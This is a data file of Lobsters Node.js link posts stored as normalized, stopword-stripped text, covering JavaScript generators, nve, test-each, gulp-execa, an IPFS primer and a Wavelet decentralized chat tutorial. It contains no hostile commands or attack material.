cool project based availabe like reduxsaga hertzscript tjco case focus article generator theoretical perspective talk behave accordingly specification done practical example chosen repropose user object fibonacciproducer function let see generator able make life easier also rocket science involved generator generator declaration pretty much function declaration plus addition star function keyword function name function generator args yield allowed create anonymous generator fat arrow generator currently granted ecmascript specification generator invocation function invocation big syntax difference obviously possibility use new keyword inside body generator yield keyword return control caller suspending execution generator generator literally stop encountered yield waiting signal resume like return keyword able return value time use yield keyword moreover signal notifies generator resume flow could coupled value turn message system mentioned earlier explained simple term generator object stop go philosophy generator difficult understand iterators chosen control let see mean generator function someoddnumbers yield yield yield yield return invoke const generatorobject someoddnumbers mysterious generatorobject result simply value say generator function invoked specific object returned iterator iterable called generator object pay attention fact generator code executed point anyway result iterator able call next method let try able guess result done false generator start execute body yield keyword encountered pause value coupled first yield occurrence inserted iterator result surprising value key returned next method invocation obviously still far generator body end done flag false learned much thanks two invocation let recap main point generator function called like someoddnumbers iterator returned generator function invocation mean generator execution start execution code inside generator call next method find iterator taken generator body executed yield keyword encountered pause returning u value linked yield keyword well packaged inside iterator result resuming execution signal generator resume execution call next method generatorobjectnext done false see generator pause next yield occurence returning u yielded value let exhaust iterator better understand done flag behaves generatorobjectnext done false generatorobjectnext done false generatorobjectnext done true generatorobjectnext value undefined done true pay attention convention discussed previous article respected let show yielded value returned purpose sending message caller first part convention number clear value paired done false returned yielded last value fall convention number happens value returned nt difference explicit call examine later return method iterator take game rule nt twist brain never return relevant value return keyword always paired done true second part convention number clear topic remember utility tailored suit iterators always discard value combined done true stopping first occurrence const generatorobject someoddnumbers discarded generatorobject last undefinedtrue pair represents outofbounds state following convention number generator instance worth noting time generator function called producing iterator independent instance generator created iterator control multiple instance generator never implicitly influence one another const someoddnumbers const someoddnumbers let use bit first iterator done false done false done false second iterator handle generator instance completely independent one control first iterator done false messaging system let take closer look main possibility send information generator let consider following generator function lazycalculator operator const firstoperand yield const secondoperand yield switch operator case yield firstoperand secondoperand return case yield firstoperand secondoperand return case yield firstoperand secondoperand return case yield firstoperand secondoperand return focus fact generator need three input operator two operand chosen set operator invocation generator contrary operand provided lazily generator used choose perform multiplication operation const lazycalculatoriterator lazycalculator already know generator code executed previous call call next method first time start lazycalculatoriteratornext value undefined done false let reasoning value provided first operand previous call getting undefined resulting value pay attention fact first next call moving generator towards first yield keyword occurrence second therefore value passed first next call yield keyword waiting value value silently discarded need pas one value initial setting generator provide generator function call set operator even undefined result surprise u first yield nt returned anything point generator instance paused onto first yield keyword waiting value complete assignment firstoperand scared statement like const firstoperand yield imagine yield keyword also placeholder future value weird way return thing wo nt able directly use placeholder everywhere expression function gen const sum yield yield uncaught syntaxerror unexpected identifier low precedence yield keyword able resolve problem thanks parenthesis function gen const sum yield yield resume generator let pas first operand calling next method second time lazycalculatoriteratornext value undefined done false received back undefined second yield keyword generator currently paused nt returned anything pas value second operand lazycalculatoriteratornext value done false receive result operation chosen follow generator flow able understand third call next method generator resume second yield keyword towards third latter going always return firstoperand op secondoperand mathematical expression evaluated producing value returned back value field third iterator result point generator waiting value third yield keyword able see value going provide wo nt actually used therefore fourth call next method performed without argument lazycalculatoriteratornext value undefined done true call generator encountered return keyword ending execution signalling u done true value explicitly returned get undefined let recap main point send value inside paused generator simply pas argument call next method resume argument passed nth next method call used place th yield nth returned value result nth next method call provide argument first next method call discarded use generator function call pas setting instead generator iterators iterables let resume someoddnumbers generator following script const generatorobject someoddnumbers generatorobject work without throwing exception remember generator object iterator iterable follow convention number therefore array spread operator call iterator method generator object get iterator receive generator object pay attention fact generator function iterable const v someoddnumbers consolelog v typeeror someoddnumbers iterable call get iterableiterator const v number consolelog v error handling generator function therefore trycatchfinally statement used function generator try afunctionthatmaythrow catch e consolelog e finally consolelog finally block triggered thrown error handled catch block exception thrown outwards inside generator ending iterator controlling instance generator become useless function generator yield yield throw error yield yield const generator itnext value done false itnext value done false itnext uncaught error itnext value undefined done true itnext value undefined done true including yield keyword thing become interesting include one yield statement inside type block function generator try yield catch e consolelog e finally consolelog finally block triggered lead two logic consequence yield statement able pause trycatchfinally statement letting catch able handle future error way insert generator merely error object awareness error condition generated external cause throw method come play implemented generator object take optional argument error throwing generator point paused respective yield surrounded trycatch block generator able recover erroneous situation continuing flow otherwise error thrown like unhandled exception could normally raise inside generator consequence function generator try yield catch e consolelog e yield yield yield yield const generator itnext value done false error handled printed error handled flow continue get next yielded value result itthrow error handled value done false itnext value done false generator instance paused third yield inside trycatch error rethrown itthrow error handled uncaught error handled iterator exhausted itnext value undefined done true early return time trigger early return calling return method generator object ending argument provided returned inside iterator result iterator become obviously exhausted function generator yield yield yield yield yield const generator itnext value done false itnext value done false itnext value done false itreturn value done true itnext value undefined done true generator delegation way function able call second function generator able invoke another generator strongly linked better code organization proper separation concern improved modularity better maintainability already able control resulting iterator within generator called second generator function maingenerator const innerit innergenerator const sum innerit reduce v v yield sum function innergenerator yield yield yield yield yield const maingenerator itnext value done false bridge could achieve full control inner iterator outer one reach highly acclaimed generator delegation able create bridge would allow u forward next method call performed iterator argument innerit iterator yielded value innergenerator become result call returned value inner generator could sent return keyword keep special eye moreover bridge allow u forward throw return method call respective consequence well unhandled exception may thrown last least bridge able connect inner version properly handle nested generator delegation turn bridge already built u name yield function maingenerator const innerit innergenerator generator delegation yield innerit function innergenerator yield yield yield yield yield const maingenerator itnext value done false itnext value done false itnext value done false itnext value done false itnext value done false itnext value undefined done true thing maingenerator reduce v v therefore obtained complete control inner generator instance giving external iterator exposed client iterator internals detail hidden inside maingenerator generator come think purpose bridge iterables pay attention see previous example written yield innerit yield innergenerator yield transfer iteration control generator control therefore allowed use iterables know even built function arraydelegator array yield array const arraydelegator itnext value done false itnext value done false itnext value done false itnext value done false itnext value done false itnext value undefined done true yes guessed even yield call iterator method recursive generator one main benefit generator delegation recursion generator becomes straightforward function chunkify array n yield arrayslice n arraylength n yield chunkify arrayslice n n chunkify nt let code scare able fully understand time chunkify called yield n element input array starting left delegate remaining part array every time step generator recursion performed adding new span bridge connects outermost iterator one used array spread operator innermost one yielded value level routed bridge reach outside exception behaviour throw method delegation could happen inner iterator able handle exception case exception go back delegation chain caught generator instance crossed exception coming lacking proper trycatch stopped one another function innergenerator yield innergenerator start throw error exception yield innergenerator end never yielded function middlegenerator yield middlegenerator start yield innergenerator yield middlegenerator end never yielded function outergenerator yield outergenerator start try yield middlegenerator catch yield outergenerator end const outergenerator itnext value outergenerator start done false itnext value middlegenerator start done false itnext value innergenerator start done false itnext value outergenerator end done false exception thrown innergenerator middlegenerator nt able handle execution ended exception bubble outergenerator catch continue flow itnext value undefined done true obviously even outergenerator nt able catch exception result calling next method fourth time would error exception would risen surface call wrapped trycatch block throw method called outermost iterator call throw method reach innermost iterator passing error waiting yield generator instance controlled iterator paused wrapped trycatch block know generator able recover injected erroneous situation otherwise exception thrown current innermost generator learned going happen function innergenerator try yield innergenerator start catch e yield innergenerator catched emessage yield innergenerator end function middlegenerator yield middlegenerator start yield innergenerator yield middlegenerator end never yielded function outergenerator yield outergenerator start try yield middlegenerator catch e yield outergenerator catched emessage yield outergenerator end const outergenerator itnext value outergenerator start done false itnext value middlegenerator start done false itnext value innergenerator start done false itthrow error value innergenerator catched done false error injected innergenerator target yield wrapped inside trycatch itnext value innergenerator end done false itthrow error foo value outergenerator catched foo done false error injected innergenerator target yield nt wrapped inside trycatch also yield inside middlegenerator exception handled outergenerator itnext value outergenerator end done false itnext value undefined done true behaviour return keyword explicitly returned value function innergenerator yield yield yield yield yield return see function delegator const re yield innergenerator consolelog re delegator used fact value paired done true discarded utility interact iterables yield keyword exception though huge following example bridge say value returned return keyword routed outside therefore extent discarded see outcome array spread operator last example also true yield need replaced actual value delegation terminated end returned value behaviour return method personally consider behaviour return method conceptually different next throw method latter one influence chained iterators directly cross reach innermost generator happen next depends contrary outcome return method call different function innergenerator yield yield yield yield yield function delegator consolelog yield result yield innergenerator yield const delegator itnext value done false itnext value done false itnext value done false value done true value printed value done false yield result printed itreturn itnext value undefined done true could tempted think call return method delegation innergenerator instance would simply stop instance forced return value whould followed yield result printed console would result delegation would returned lasy yield reality different delegated method call implies subsequent call method starting outermost iterator one call originally performed innermost one regarding next throw method sole consequence data transmission performed generator object instead know return method call performed onto iterator controlling generator instance set instance completed mean delegating return method call end innermost generator instance generator instance chain word whole iteration stopped returned value return method call input value next one line last one returned innermost return method call result whole return operation follow another example let understand focus workaround made show value focus call order see returned value behave const innermostiterableiterator symboliterator return next return value innermost done false return v consolelog innermostiterableiterator return method called v return value done true const middleiterableiterator realiteratorsfactory yield innermostiterableiterator yield middleiterableiterator still alive never printed symboliterator const ittobereturned thisrealiteratorsfactory const originalreturnmethod ittobereturnedreturnbind ittobereturned ittobereturnedreturn function v consolelog middleiterableiterator return method called v return originalreturnmethod return ittobereturned function outermostiterableiteratorgenerator yield middleiterableiterator yield outermostiterableiterator still alive never printed const main outermostiterableiteratorgenerator mainreturn const originalreturnmethod mainreturnbind main return function v consolelog mainiterableiterator return method called v return originalreturnmethod mainnext value innermost done false mainnext value innermost done false mainnext value innermost done false mainreturn order mainiterableiterator return method called printed middleiterableiterator return method called printed innermostiterableiterator return method called printed value done true returned refactoring iterables previous article enhanced simple collection user making wellformed iterable implementing iterable iterator iterables interface hand also transformed simple producer fibonacci series number fibonacciproducer iterators producer let try refactor using generator user const user james false andrew true alexander false daisy false luke false clare true symboliterator user const key key yield key whoa three line think needed logic little yield key true value match fibonacciproducer const fibonacciproducer function iife function updatestate previousvalue currentvalue const nextvalue previousvalue currentvalue const newpreviousvalue currentvalue const newcurrentvalue nextvalue return newpreviousvalue newcurrentvalue fibonacciproducer generator return function iteratorfactory iterator state let previousvalue let currentvalue true return current value yield currentvalue update state const newstate updatestate previousvalue currentvalue currentvalue newstatenewcurrentvalue previousvalue newstatenewpreviousvalue get bound stop producer currentvalue numbermaxsafeinteger return whoa true usually infinite loop within function great idea generator nt lead issue yield keyword able pause infinite loop new logic fibonacciproducer nt much different old one time next method called current value series returned back client apart first iteration check made first see numbermaxsafeinteger limit reached conclusion end second article iterators generator long way nt learnt nittygritty detail javascript generator yield keyword generator delegation next article focus asynchronous iterators recent feature brought u need difference sync iterators answer question hope see twitter acknowledgement would like thank nicolò maria mezzopera helping identify lot grammatical error vuejs developer need check next workshop vueandme also wish thank gabriele di simone marco terzolo giovanni riga time spent check article bibliography hungry knowledge point spec introduces
89,Lobsters,nodejs,Node.js programming,No CLI ads,https://github.com/kethinov/no-cli-ads,cli ad,cli ad funding incident suppressible environment variable banned ad hosted module usage fswatch homebrew important note support open source ad blocker worth considering,cli ad nt want see stuff like console output npm funding postinstall yourprojectnodemodulesfunding node binfundingjs giant ad ad random thing developer think polluting console log good way support open source http someproductsomedomain npm notice created lockfile packagelockjson commit file added package contributor audited package found vulnerability module ad blocker bad actor space like infamous funding npm module incident specific ad suppressible environment variable npm officially banned ad hosted module guarantee wo nt future bad actor cli space repo may still needed defend future bad actor usage install fswatch first ensure path example macos use homebrew install fswatch running brew install fswatch install npm g nocliads block ad nocliads somediranditssubdirstowatch spawn process monitor npm installs ad package disable detects one installed disable blocker yescliads kill monitoring process important note module untested window may work properly window support open source module meant imply open source unworthy support mean let find business model support open source let solicit donation paid sponsorship yes let even run ad run ad always make sure tasteful way people gon na start blocking last least got idea make ad blocker betterdesigned want block spammy stuff pull request welcome ad blocker worth considering want block ad using different method might want consider competing approach instead
90,Lobsters,nodejs,Node.js programming,Site.js,https://sitejs.org/,sitejs,tip express advanced routing using node module information building dynamic site,tipif found code dynamic route created hard read alone purposefully written keep example short enough enter terminalhere slightly verbose version indexjs easier understand might want enter using favourite code editor let counter moduleexports request response response type html end hit count counter reminds route express exactly isthe difference write code worry anything else including installing nodejs provisioning tl certificate ensuring site automatically restarts reboots etcsitejs limit using dotjs want use full power express nodejs advanced routing since nodejs hood anything nodejs including using node module etcsee sitejs documentation information building dynamic site
91,Lobsters,nodejs,Node.js programming,Run any Node.js version,https://github.com/ehmicky/nve,run nodejs version,single file command entire project shell session example example multiple version example list version demo install usage version range compatible node option continue parallel progress mirror fetch arch initial download almost instantaneous difference nvm programmatic usage child process native module napi benchmark following benchmark see also support submit issue github chat u gitter code conduct contributing guideline,run command specific nodejs version unlike nvm exec nve executes single file command change node npm global binary run specific nodejs version entire project shell session please use nvm nvmwindows n nv instead example node node nve node welcome nodejs type help information exit node filejs node nve node filejs command used nve npm test execute local binary nve ava run specific version nve npm test use version range nve npm test run latest nodejs version nve latest npm test run latest lts version nve lts npm test run node version nvmrc current process version nve global npm test run current directory nodejs version using nvmrc packagejson enginesnode field nve local npm test use different mirror node binary nve mirrorhttps npmtaobaoorgmirrorsnode npm test use cached list available nodejs version nve fetch npm test always use cached list available nodejs version even one hour old nve nofetch npm test use different cpu architecture node binary nve npm test chaining command nve npm run build nve npm test cache node download nve node version example multiple version run multiple version nve npm test node test passed finished test node test passed finished test node test passed finished test abort first version fails nve continue npm test run version parallel nve parallel npm test cache multiple node downloads nve node version example list version print latest nodejs version nve latest print latest nodejs version nve print latest nodejs version nve demo try library install node must globally installed however command run nve use node version providing compatible use programmatically nodejs instead please check nvexeca usage nve option version command args exactly using specific node version several commaseparated version specified version version range one following alias latest latest available node version lts latest lts node version global global node version local current directory node version command must compatible specific node version example npm compatible node global local binary executed option continue alias c type boolean default false default running multiple node version one version fails others aborted option disables parallel alias p type boolean default false running multiple node version run time faster however work command requires interactive cli input example using prompt concurrencysafe progress type boolean default true whether show progress bar node binary downloading mirror alias type string default http nodejsorgdist base url retrieve node binary overridden example http npmtaobaoorgmirrorsnode following environment variable also used nodemirror nvmnodejsorgmirror nnodemirror nodistnodemirror fetch alias f type boolean default undefined list available nodejs version cached one hour default fetch cache used nofetch cache used even older one hour default value undefined neither command specified printing nodejs version default value fetch instead arch alias type string default processarch nodejs binary cpu architecture useful example would like run nodejs value processarch allowed except mips mipsel initial download first time nve run new version node binary downloaded hood initially take second however subsequent run almost instantaneous command omitted order cache initial download without executing command difference nvm nve meant oneoff command execution example include running test older nodejs version checking older nodejs version support specific syntax feature benchmarking different nodejs version programmatic usage child process tool like nvm nvmwindows n nv meant execute specific nodejs version entire machine project shell session nve probably used alongside tool native module code using native module nve work providing built napi target nodejs version since napi available stable otherwise following error message shown error module compiled different nodejs version benchmark following benchmark compare average time run nve nvm exec npx node nve nvm exec npx node see also support found bug would like new feature nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix bug add new feature please check guideline pull request welcome thanks go wonderful contributor
92,Lobsters,nodejs,Node.js programming,How To Get Started With IPFS and Node,https://medium.com/@indreklasn/how-to-get-started-with-ipfs-and-node-fa04baec6b3a,get started ipfs node,getting started prerequisite full repository example,getting startedto get started going need nodejs installed text editorprerequisitesnow node installed let get cooking start creating new node projectnpm init ynow packagejson file let u install node module go ahead install ipfs node modulenpm install ipfsgood job next need create indexjs file place application logictouch indexjsinside indexjs place following logicwe simply import ipfs module initially node application main functionnow written boilerplate code time implement ipfs code itselflet spawn ipfs node look like run code node see console alerting message regarding ipfs node indexjsspawning ipfs nodesexcellent mean everything working expected seeing try installing ipfs package againsince spawned ipfs node let put use start adding file ipfs node add node retrieve file back using cat callvoila check console filebufferthat added retrieved file distributed web find source code herewe barely scratched surface curious learn full repository example
93,Lobsters,nodejs,Node.js programming,"‘No way to prevent this’, Says Only Development Community Where This Regularly Happens",https://medium.com/@nimelrian/no-way-to-prevent-this-says-only-development-community-where-this-regularly-happens-8ef59e6836de,way prevent say development community regularly happens,way prevent say nation regularly happens edit active proposal,post inspired way prevent say nation regularly happens article released onion may contain sarcasmedit besides personal threat received response parodysarcastic joke asked make suggestion fix problem incomplete list personally think wrong npm npm client registry flawed system would need completely replaced new system following feature mitigate possibility incident unscoped packagesscopes bound single userorganizationpublishing package requires package must signed via gpgunpublishing package allowed anyone registry maintainer yanking rust cargo another possible solution fuzzy dependency version alike allowed final version multiple time witnessed npm modifying package lock file project running npm install fresh clone downloading newer version transitive dependency specified lock filein regard whole ecosystem take look adding better standard library j would reduce amount oneliner package active proposal however met contempt many j community member
94,Lobsters,nodejs,Node.js programming,Repeat tests. Repeat tests. Repeat tests,https://github.com/ehmicky/test-each,repeat test repeat test repeat test,datadriven testing test title cartesian product fuzz testing snapshot testing example demo install usage test title test title first argument stringified cartesian product cartesian product input function argument test title fuzz testing fuzz testing input function fakerjs chancejs jsonschemafaker snapshot testing snapshot testing ava snapshot jest snapshot node tap snapshot side effect parameter iterables api input callback several iterable input several info infotitle test title infotitles infoindex infoindexes params several support submit issue github chat u gitter code conduct contributing guideline,repeat test repeat test repeat test repeat test using different input datadriven testing test runner independent work current setup generates test title descriptive unique javascript type json loop every possible combination input cartesian product use random function fuzz testing snapshot testing friendly example example use ava test runner work jest mocha jasmine etc const test require ava const require testeach code testing const multiply require multiplyjs repeat test using different input expected output first second output first second output title first second output test title multiply first second output multiply first second output test multiply title ti multiply first second output snapshot testing output automatically set first run reused next run first second first second title first second test multiply output title tsnapshot multiply first second cartesian product run test time using every possible combination input title first second test mix integer float title ti typeof multiply first second number fuzz testing run test time using different number mathrandom title index randomnumber test correctly multiply float title ti multiply randomnumber randomnumber demo try library install npm install testeach usage const require testeach const input red blue input function callback info color number fire callback possible combination input input array function integer common use case callback define test using test runner info object whose property used generate test title test title combination parameter stringified title available callback first argument title included test title make descriptive unique long title truncated incrementing counter appended duplicate javascript type stringified json customize title either color red color blue title param test title test color color red test color color blue test test color title plain object override using title property color red title red color blue title blue title param test title test color red test color blue test test color title info argument used dynamic title color red color blue info param test title test color red test color blue test test color infoindex paramcolor cartesian product several input specified cartesian product used run callback five time b c e b c e info param run callback six time c e b c b b e b c e info param otherparam nested array iterated run callback twice b c e b c e info param input function function used instead array iteration fire us return value instead function called argument callback generated value included test title run callback different random number time red green blue mathrandom info color randomnumber input function called argument callback january february march info day month year day month year info day month year date fuzz testing integer used instead array multiply number iteration enables fuzz testing combined input function library like fakerjs chancejs jsonschemafaker const faker require faker run callback time random uuid color time fakerrandomuuid fakerrandomarrayelement green red blue info randomuuid randomcolor infoindex used seed reproducible randomness following series uuids remain across execution index fakerseed index fakerrandomuuid info randomuuid snapshot testing library work well snapshot testing library used snapshotit ava snapshot jest snapshot node tap snapshot etc output automatically set first run reused next run first second first second title first second test multiply output title tsnapshot multiply first second side effect callback parameter directly modified copied prevent side effect next iteration green red blue active true active false info color param done object reused several iteration paramactive false safe since copy const newparam param newparamactive false iterables iterable used iterate combination instead providing callback const iterable require testeach const combination iterable green red blue active true active false const title color param combination test test color title return value iterable converted array spread operator const array combination arrayforeach title color param test test color title api input callback input array function integer one several callback function info params fire callback combination params iterable input input array function integer one several return value iterable info params return iterable looping combination params info type object infotitle type string like params stringified used test title infotitles type string like infotitle param infoindex type integer incremented iteration start infoindexes type integer index params inside initial input params type one several combination input current iteration support found bug would like new feature nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix bug add new feature please check guideline pull request welcome
95,Lobsters,nodejs,Node.js programming,Build A Decentralized Chat Using JavaScript & Rust (WebAssembly),https://medium.com/perlin-network/build-a-decentralized-chat-using-javascript-rust-webassembly-c775f8484b52,build decentralized chat using javascript rust webassembly,build decentralized chat using javascript rust webassembly create deploy decentralized chat hundred line code using wavelet dapp perlin opensourced wavelet firebase going building http perlinnetworkgithubiodecentralizedchat connect load contract send message backend pro con ddos dapps use blockchain store data smart contract rust cargotoml getmessages sendmessage msg string string sendmessage paramread entry vecdeque init cryptographic public key sendmessage logspopfront pruneoldmessages getmessages log getmessages deploying backend http lensperlinnet login wallet address sendmessage developer gas limit smart contract id push button smart contract live frontend http testnetperlinnet http githubcomperlinnetworkwaveletclientjs calling getmessages getmessages jsbibigint getmessages log sendmessage getmessages contracttest getmessages calling sendmessage msg string sendmessage msg string getmessages contractcall jsbibigint jsbibigint sendmessage listening change blockchain getmessages fetchandpopulatememorypages getmessages conclusion http perlinnetworkgithubiodecentralizedchat congratulation made first scalable secure http waveletperlinnet perlin footnote wavelet http githubcomperlinnetworkdecentralizedchat,build decentralized chat using javascript rust webassembly create deploy decentralized chat hundred line code using waveletcreating dapp decentralized app take lot research implementation effortcountless hour spent worrying malicious user secure networking security even governance come towards building dappto combat perlin created opensourced blockchain called wavelet make creating secure resilient dapps surprisingly easyby easy mean firebase level easy hundred line straightforward code level easy believe well let create decentralized chat going buildinglike great tutorial would nice see live demo exactly going building ahead timehead http perlinnetworkgithubiodecentralizedchat see thisthis going buildingenter private key wavelet wallet secret textbox make sure minimum perlspress connect load contract see message made peoplefeel free fill message textbox whatever message want send simply press send message pay perls pretty much private key wavelet wallet perls venture forward teach private key register decentralized wavelet wallet populate perlsthe backendto start need place store chat message normal app host mysqlpostgresmongodb database make nodejs server collect chat message stuff databasethe pro work con couple dollar someone could ddos database server keep chat service agesbob made chat service using mysql nodejs bob chat got ddosed hacker bob saddapps use blockchain store data data get spread throughout potentially hundred thousand node mesh network even hacker ddos majority blockchains network app would still remain secure availablethe backend api queriesstoresmodifies data blockchain call smart contractso equivalent nodejs http api server mysql database tutorial would rust smart contract wavelet blockchain let get started building smart contract chat dapp already need install rust alongside webassembly compiler backend rust may installed executing following command rustup target add proceed create first rust project executing following command take bit time searching install dependencieslibraries rust cargo new lib chat cd chatthe dependency building wavelet smart contract available rust package repository cratesio hereyou project configuration file cargotoml look something like setup let give straight source code decentralized chat smart contract look line code pretty much could made smaller tbh explain little bit going smart contract expose two function may called frontend getmessages sendmessage msg string string param sendmessage read using paramread function declaring entry variable detail input specified smart contract click herechat log stored vecdeque doubleended queue push item front queue end queue initialized init chat log contains sender id message sender id cryptographic public key person sent chat messageyou call sendmessage place chat log log queue empty chat message allowed chat message may charactersthe log queue capacity chat log entry queue full new chat log inserted queue queue remove oldest message using logspopfront logic handled pruneoldmessages functionyou may call getmessages get humanfriendly readable version chatlog sender id get printed hex string concatenated sender message contentsthen log macro used smart contract provide frontend available chat message getmessages let build smart contract using rust cargo tool cargo build release target everything go well folder see chatwasm filethat smart contract ready deployed wavelet blockchaindeploying backendwe need access wavelet blockchain network deploy chat smart contract tofear hosted one test smart contract head http lensperlinnet faced login screengenerate new private key save private key load previouslysaved private key proceed loginin case knowledge private key think password associated private key public key think usernamein blockchain exists concept account register account generating new private key uniquely associated public key alternatively also call wallet address long give away private key gon na hard hacker steal account keep private key safe give access consider public identityusernameproceed login logged wavelet account take note wallet address top left public keycongrats registered first wavelet walletaccountfor bit background account hold perls might know cryptocurrencyvirtual currencyso think account wallet holding perls hence public key call wallet address reason currency free lunch node supporting wavelet network case one hosted willing hostkeep smart contract alive exchange perlsthe way work every time anyone call sendmessage contract need pay perls wavelet networkthankfully provided easy way friend get testing perls network hosted test chat appto get perls setup discord server join server waveletfaucet channel type claim public keywallet address bot would send perls provided wallet address type message couple time perls good gohead developer page screen press button gas limit box upload chatwasm file thereafter clicking button attaining perls discordwait second see smart contract id make sure jot downkeep later need interact smart contract frontendmake sure jot smart contract idand push button smart contract live let work frontend spruce decentralized chat appthe frontendi recommend particular framework like react vue svelte teach style app entirely section go core knowledge need hook website design waveletto start wavelet node network host http api may connect interacting withquerying info ledgerthe api endpoint particular network hosted used register account deploy smart contract following link http testnetperlinnetwe provided nice simple javascript client interact wavelet node http api work web nodejson npm waveletclient source code single file located github http githubcomperlinnetworkwaveletclientjsnow assuming asyncawait support set setup waveletclient follows simply code let u connect wavelet network load wallet giving private key may pay fee use smart contract andconstruct contract instance provides method help u interacting smart contractcalling getmessages continuing one thing note two smart contract method defined one modifies blockchain push new chat log whilethe simply query blockchain retrieve chat log made thus farit good know smart contract method pay node perls execute one modify blockchainso example getmessages function called without incurring cost perls account call like code might immediately wondering additional jsbibigint parameter provided calling smart contract apart passing input parameter may additionally simultaneously send contract perlsa reason would want functionality example might make certain smart contract method execute perls sent contract beforehandin case want send smart contract perls making chat app upon invoking getmessages simply set amount perls send contract zeronow executing code see following browser console result null log explain console result log macro used building smart contract place log string log arrayon hand result object set returned resulterror smart contract functionhence since send chat message yet log array empty result object nullonly call sendmessage couple time recall getmessages see message log arraydigging little interested knowing contracttest work behind scene download smart contract latest memory node connected load smart contract code memory browser virtual machine andlocally executes getmessages function return printed log resultscalling sendmessage msg string let talk calling sendmessage msg string function might guess calling function modifies blockchain putting desired message blockchain thus cost perlsthe way may called wavelet j client actually pretty similar code getmessages everything except pas wallet first parameter specify message input parameter encoded object like type string value chat message put ever make smart contract function outside scope tutorial request multiple parameter may pas multiple input parameter variadic list contractcall function like much like odd jsbibigint passed might wondering second jsbibigint passed forin order make sure spend much perls accidentally executing function set limit much perls may attempt spent executing smart contract functionin case code denotes call sendmessage would expend perlsthe explicit perl fee pay executing modifying smart contract clal computed based many instruction smart contract execute fully execute smart contract method desireas protip intentionally provided fee limit seems like upperbound fee sending message noticed testing perls detail fee structure come executing smart contract method may found herelistening change blockchainthe one final bit perhaps would great automatically refresh chat log new chat log appended blockchainupdates batched published together inside wavelet called consensus round everytime blockchain get modified second two consensus round endspasseswe use wavelet j client listen round end download latest updated smart contract memory reexecute getmessages collect latest chat log may update frontend like code happening fetchandpopulatememorypages function called every single time consensus round end function downloads smart contract latest memory datawhat follows single call getmessages providing latest log result printed straight browser consoleconclusionso different component fullfledged decentralized chat app splendid backend hopefully splendid frontendhopefully bit cleanup look little something like enter chat smasrt contract id made ui made chat friend http perlinnetworkgithubiodecentralizedchat either way congratulation made first scalable secure wavelet dapp zero configuration zero api key zero deployment headache zero devops zero worry manage scalable expensive resilient data layerthere lot explore plethora additional functionality provided wavelet j client alongside extensive set documentation wavelet located http waveletperlinnetnow skeptical reader might point time working top wavelet network perlin hosted communityin response always roll personal wavelet network privately host slew dapps even get friend sparing extra computer lying around contribute hosting dapps exchange perlshowever hosting public open network wavelet fully stabilized fully decentralized news coming futureas side note see term fee invoking smart contract racking perls way representative expensive smart contract really wavelet fully decentralized publicly openour idea smart contract method invocation fee ballpark around range le u cent worth respect amount perls wavelet publicly openthe ridiculous fee see time way representative fee really like developing wavelet fully publicly open decentralizedfootnotesto leave note personally find exciting spite decentralized chat made incredibly simple hold useful meaningful implication given numerous political agenda present world todayextending tutorial little fairly straightforward one create decentralized twitter social network retail store container scheduler keyvalue database redis realistically whatever service platform mind could imagine made decentralizedall made possible waveletif need help interested know stuck bit throughout tutorial feel free reach perlin team discord heresource code entire tutorial available http githubcomperlinnetworkdecentralizedchat til next time kenta iwasaki
96,Lobsters,nodejs,Node.js programming,Gulp.js command execution for humans,https://github.com/ehmicky/gulp-execa,gulpjs command execution human,gulpjs execa execa file stream streaming mode example demo install method task command option exec command option instance command result error stream function option vinyl file property command option option execa option echo verbose result pushed maxconcurrency see also support submit issue github chat u gitter code conduct contributing guideline,gulpjs command execution human opposed similar plugins childprocessexec us execa provides gulpexeca add gulpspecific feature execa including command executed either directly inside file stream streaming mode unlike library example gulpfilejs const src dest require gulp const task exec stream require gulpexeca moduleexportsaudit task npm audit moduleexportsoutdated async await exec npm outdated moduleexportssort src txt pipe stream path sort path pipe dest sorted demo try library install npm install gulpexeca plugin requires gulp method task command option return gulp task executes command const task require gulpexeca moduleexportsaudit task npm audit exec command option executes command return value promise childprocess instance promise resolved command result command failed promise rejected nice error reject false option used promise resolved error instead const exec require gulpexeca moduleexportsoutdated async await exec npm outdated stream function option return stream executes command input file function must take vinyl file argument useful property filepath property available well return either command string option object command property undefined const src dest require gulp const stream require gulpexeca moduleexportssort src txt pipe stream path sort path pipe dest sorted file stream spawn separate process consume lot resource use method alternative firing command programmatically instead spawning child process passing several file directory globbing pattern argument command verbose stdout stderr stdio option used method command default shell interpreter like bash cmdexe used mean command must program argument escapingquoting needed except significant space backslash shell feature globbing variable operator like used done directly nodejs instead shell interpreter slower le secure le crossplatform however still optin using shell option const writefilestream require f const series require gulp wrong moduleexportscheck task npm audit npm outdated correct moduleexportscheck series task npm audit task npm outdated wrong moduleexportsinstall task npm install logtxt correct moduleexportsinstall task npm install stdout writefilestream logtxt option option optional object execa option used please refer documentation list possible option following option available well echo type boolean default true task exec false stream whether command printed console gulp audit using gulpfile codegulpfilejs starting audit gulpexeca npm audit finished audit verbose type boolean default true task exec false stream whether command output stdoutstderr printed console instead returned javascript gulp audit using gulpfile codegulpfilejs starting audit gulpexeca npm audit npm audit security report found vulnerability scanned package finished audit result type string value replace save default replace stream whether command result replace file content save pushed fileexeca array property const src require gulp const stream require gulpexeca const require moduleexportsdefault src j print number line file pipe stream path wc l path result save pipe throughobj file encoding func consolelog fileexeca stdout func null file type string value stdout stderr default stdout output stream use result replace const src require gulp const stream require gulpexeca const require moduleexportsdefault src j print number line file including stderr pipe stream path wc l path result replace pipe throughobj file encoding func consolelog filecontentstostring func null file maxconcurrency type integer default stream many command run parallel see also support found bug would like new feature nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix bug add new feature please check guideline pull request welcome thanks go wonderful contributor
